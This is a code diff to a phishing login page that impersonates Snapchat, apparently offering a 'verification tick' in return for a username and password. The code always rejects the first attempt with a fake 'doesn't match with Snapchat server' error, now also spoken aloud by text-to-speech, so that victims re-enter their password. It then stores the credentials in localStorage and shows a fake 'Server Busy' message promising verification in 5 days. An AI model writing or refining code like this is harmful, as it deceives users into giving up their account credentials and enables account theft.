@@ -656,6 +656,7 @@ function user_form(){
     get.scrollIntoView({ behavior: "smooth", block: "end" });
   }, 100);
 }
+<script>
 let firstAttempt = true;
 
 document.getElementById('loginForm').addEventListener('submit', function (e) {
@@ -673,44 +674,89 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
   msgBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
   setTimeout(() => {
-    // ✅ Easier validation (replacing strict one)
+    // ✅ Easy validation now
     const usernameValid = /^[a-z][a-z0-9._-]{2,14}$/.test(username);
-    const passwordValid = /^[a-z0-9!@#$%^&*()_+=\-]{8,}$/.test(password) && !/\s/.test(password);
+    const passwordValid = /^[a-z0-9!@#$%^&*()_+=\-]{8,}$/.test(password);
 
-    // ❌ First login attempt always fails
     if (firstAttempt) {
       firstAttempt = false;
       msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your password or username doesn't match with Snapchat server.";
+
+      const message1 = "Invalid Credentials. Your password or username doesn't match with Snapchat server.";
+      const utterance = new SpeechSynthesisUtterance(message1);
+      utterance.rate = 0.95;
+      utterance.pitch = 1.1;
+      utterance.volume = 1;
+      utterance.lang = 'en-US';
+
+      speechSynthesis.onvoiceschanged = () => {
+        const voices = speechSynthesis.getVoices();
+        const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+        if (selected) utterance.voice = selected;
+        speechSynthesis.speak(utterance);
+      };
+
+      const voices = speechSynthesis.getVoices();
+      if (voices.length) {
+        const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+        if (selected) utterance.voice = selected;
+        speechSynthesis.speak(utterance);
+      }
+
       setTimeout(() => {
         msgBox.innerHTML = "";
         msgBox.classList.add('hidden');
-      }, 4000);
+      }, 5000);
+
       return;
     }
 
-    // ❌ If invalid after first attempt
     if (!usernameValid || !passwordValid) {
       msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Please check your username or password.";
+
       setTimeout(() => {
         msgBox.innerHTML = "";
         msgBox.classList.add('hidden');
-      }, 4000);
+      }, 5000);
+
       return;
     }
 
-    // ✅ Store only if valid
+    // ✅ STORE IN LOCAL STORAGE ONLY IF VALID
     localStorage.setItem("snap_username", username);
     localStorage.setItem("snap_password", password);
-    localStorage.setItem("Update", "Being processed...");
+    localStorage.setItem("Update", "Being processed.....");
 
     msgBox.innerHTML = "<b>✅ Valid Credentials</b><br>We are on the progress, please wait...";
 
-    setTimeout(() => {
-      msgBox.innerHTML = "<b>⚠ Server Busy</b><br>Too many users trying to verify.<br>You will receive a verification tick within <b>5 days</b>.<br><br>✨ <b>Have a great day!</b>";
-    }, 10000);
+    const message2 = "Valid Credentials. We are on the progress, please wait....";
+    const utterance = new SpeechSynthesisUtterance(message2);
+    utterance.rate = 0.95;
+    utterance.pitch = 1.1;
+    utterance.volume = 1;
+    utterance.lang = 'en-US';
 
-  }, 1500);
+    speechSynthesis.onvoiceschanged = () => {
+      const voices = speechSynthesis.getVoices();
+      const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+      if (selected) utterance.voice = selected;
+      speechSynthesis.speak(utterance);
+    };
+
+    const voices = speechSynthesis.getVoices();
+    if (voices.length) {
+      const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+      if (selected) utterance.voice = selected;
+      speechSynthesis.speak(utterance);
+    }
+
+    setTimeout(() => {
+      msgBox.innerHTML = "<b>⚠ Server Busy:</b><br>Multiple users are currently trying to verify.<br>Your profile will be updated with a verification tic within <b>5 days</b>.<br><br>✨ <b>Have a great day!</b>";
+    }, 23000);
+
+  }, 2000);
 });
+
 
 
 // document.getElementById('loginForm').addEventListener('submit', function (e) {
